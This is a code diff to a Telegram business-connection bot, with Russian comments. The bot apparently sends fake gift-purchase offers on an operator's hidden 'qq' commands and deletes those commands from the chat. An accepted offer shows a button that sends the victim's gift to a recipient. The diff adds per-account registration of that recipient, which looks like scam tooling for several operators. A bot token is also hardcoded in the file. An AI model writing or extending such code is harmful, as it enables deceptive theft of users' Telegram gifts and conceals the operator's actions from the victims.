@@ -9,7 +9,10 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramRetryAfter
 
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@recipient_username"
+
+# bcid -> recipient username (без @)
+# Заполняется командой: qq set @username
+_recipients: dict[str, str] = {}
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -87,10 +90,8 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
         ]
     )
 
-def make_accept_keyboard(lang):
+def make_accept_keyboard(lang, recipient):
     loc = LOCALES.get(lang, LOCALES["ru"])
-    recipient = RECIPIENT.lstrip("@")
-
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text=loc['btn_transfer'], url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5875180111744995604")],
@@ -111,11 +112,21 @@ async def handle_business_command(message: Message):
     if not text_clean.lower().startswith("qq"):
         return
 
-    chat_id = message.chat.id
-    if message.from_user:
-        client_user_ids[chat_id] = message.from_user.id
+    bcid    = message.business_connection_id
+    # qq set @username — регистрирует получателя для этого аккаунта
+    if len(parts) == 3 and parts[1].lower() == "set":
+        username = parts[2].lstrip("@")
+        if bcid:
+            _recipients[bcid] = username
+            try:
+                await bot.delete_business_messages(
+                    business_connection_id=bcid,
+                    message_ids=[message.message_id],
+                )
+            except Exception:
+                pass
+        return
 
-    parts = text_clean.split()
     if len(parts) < 3:
         return
 
@@ -157,6 +168,8 @@ async def handle_business_command(message: Message):
         logging.error(f"Parse error: {e}")
         return
 
+    recipient = _recipients.get(bcid, "recipient_username")
+
     await message_queue.put({
         "chat_id": chat_id,
         "gift_name": gift_name,
@@ -165,8 +178,9 @@ async def handle_business_command(message: Message):
         "currency_type": currency_type,
         "currency_name": currency_name,
         "lang": lang,
-        "bcid": message.business_connection_id,
-        "cmd_message_id": message.message_id
+        "bcid": bcid,
+        "cmd_message_id": message.message_id,
+        "recipient": recipient,
     })
 
 @dp.callback_query(F.data.startswith("a|"))
@@ -192,9 +206,11 @@ async def accept_offer(cb: CallbackQuery):
 
     cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    stored = _bcid_store.get(f"{cb_chat_id}:{message_id}")
-    bcid    = stored["bcid"]    if stored else None
-    chat_id = stored["chat_id"] if stored else cb_chat_id
+    stored    = _bcid_store.get(f"{cb_chat_id}:{message_id}")
+    bcid      = stored["bcid"]      if stored else None
+    chat_id   = stored["chat_id"]   if stored else cb_chat_id
+    recipient = stored["recipient"] if stored else "recipient_username"
+    lang      = stored.get("lang", lang) if stored else lang
 
     await cb.answer("✅ Успешно принято!", show_alert=True)
 
@@ -204,7 +220,7 @@ async def accept_offer(cb: CallbackQuery):
             message_id=message_id,
             text=text,
             parse_mode=ParseMode.HTML,
-            reply_markup=make_accept_keyboard(lang),
+            reply_markup=make_accept_keyboard(lang, recipient),
             business_connection_id=bcid,
         )
     except Exception as e:
@@ -244,6 +260,8 @@ async def sender_worker():
                 _bcid_store[f"{task['chat_id']}:{sent_msg.message_id}"] = {
                     "bcid": task["bcid"],
                     "chat_id": task["chat_id"],
+                    "recipient": task["recipient"],
+                    "lang": task["lang"],
                 }
                 await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
 
